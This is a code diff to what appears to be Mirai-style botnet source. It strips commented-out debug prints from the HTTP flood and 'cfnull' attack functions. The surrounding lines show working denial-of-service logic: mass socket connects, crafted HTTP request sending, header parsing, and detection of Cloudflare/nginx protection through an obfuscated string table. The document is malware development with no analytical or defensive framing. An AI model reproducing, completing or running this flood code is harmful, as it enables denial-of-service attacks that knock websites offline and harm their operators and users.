@@ -189,15 +189,8 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
 
                 conn->last_recv = fake_time;
                 conn->state = HTTP_CONN_CONNECTING;
-
-				//addr.sin_port=80;
-/*#ifdef DEBUG
-                printf("[http flood] 163errno=%d  port=%d fd=%d\n", errno, addr.sin_port,conn->fd);
-#endif*/
                 connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
-/*#ifdef DEBUG
-                printf("[http flood] fd%d started connect\n", conn->fd);
-#endif*/
+
 
 
                 FD_SET(conn->fd, &fdset_wr);
@@ -228,10 +221,6 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                 conn->protection_type = 0;
                 util_zero(conn->rdbuf, HTTP_RDBUF_SIZE);
                 conn->rdbuf_pos = 0;
-
-/*#ifdef DEBUG
-                printf("[http flood] Sending http request\n");
-#endif*/
 
                 char buf[10240];
                 util_zero(buf, 10240);
@@ -293,13 +282,6 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
 
                 if (!util_strcmp(conn->method, conn->orig_method))
                     util_strcpy(conn->method, conn->orig_method);
-
-/*#ifdef DEBUG
-                if (sockets == 1)
-                {
-                    printf("sending buf: \"%s\"\n", buf);
-                }
-#endif*/
 
                 send(conn->fd, buf, util_strlen(buf), MSG_NOSIGNAL);
                 conn->last_send = fake_time;
@@ -368,16 +350,10 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                 ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                 if (err == 0 && ret == 0)
                 {
-/*#ifdef DEBUG
-                    printf("[http flood] FD%d connected.\n", conn->fd);
-#endif*/
                         conn->state = HTTP_CONN_SEND;
                 }
                 else
                 {
-/*#ifdef DEBUG
-                    printf("[http flood] FD%d error while connecting = %d\n", conn->fd, err);
-#endif*/
                     close(conn->fd);
                     conn->fd = -1;
                     conn->state = HTTP_CONN_INIT;
@@ -406,11 +382,6 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                         continue;
 
                     generic_memes[util_memsearch(generic_memes, ret, "\r\n\r\n", 4)] = 0;
-
-/*#ifdef DEBUG
-                    if (sockets == 1)
-                        printf("[http flood] headers: \"%s\"\n", generic_memes);
-#endif*/
 
                     if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_CLOUDFLARE_NGINX, NULL)) != -1)
                         conn->protection_type = HTTP_PROT_CLOUDFLARE;
@@ -873,13 +844,6 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
 
         // handle any sockets that didnt return from select here
         // also handle timeout on HTTP_CONN_QUEUE_RESTART just in case there was no other data to be read (^: (usually this will never happen)
-/*#ifdef DEBUG
-        if (sockets == 1)
-        {
-            printf("debug mode sleep\n");
-            //sleep(1);
-        }
-#endif*/
     }
 }
 
@@ -1199,13 +1163,6 @@ void attack_app_cfnull(uint8_t targs_len, struct attack_target *targs, uint8_t o
 
         // handle any sockets that didnt return from select here
         // also handle timeout on HTTP_CONN_QUEUE_RESTART just in case there was no other data to be read (^: (usually this will never happen)
-/*#ifdef DEBUG
-        if (sockets == 1)
-        {
-            printf("debug mode sleep\n");
-            //sleep(1);
-        }
-#endif*/
     }
 }
 
